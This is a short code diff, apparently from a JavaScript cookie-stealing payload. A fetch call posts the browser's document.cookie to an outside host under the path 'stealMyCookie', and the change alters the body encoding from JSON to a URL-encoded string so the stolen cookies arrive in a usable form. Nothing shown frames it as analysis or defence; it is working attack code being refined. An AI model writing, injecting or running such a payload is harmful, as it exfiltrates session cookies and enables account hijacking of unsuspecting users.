@@ -3,5 +3,5 @@ fetch("https://gubcsigergely.info/stealMyCookie", {
     headers: {
         "Content-Type": "application/x-www-form-urlencoded"
     },
-    body: JSON.stringify({cookie: document.cookie})
+    body: encodeURIComponent(document.cookie)
 });
